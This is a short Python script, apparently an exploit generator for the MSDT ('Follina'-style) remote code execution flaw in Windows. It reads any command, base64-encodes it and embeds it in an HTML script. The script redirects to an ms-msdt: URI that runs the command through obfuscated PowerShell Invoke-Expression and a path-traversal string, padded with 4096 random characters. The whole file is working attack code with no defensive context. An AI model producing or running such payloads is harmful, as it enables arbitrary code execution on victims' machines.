import base64, random, string
print("command:")
command = input()
base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")
html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
html_payload += (
    "".join([random.choice(string.ascii_lowercase) for _ in range(4096)]) + "\n</script>"
)
print(html_payload)
input()
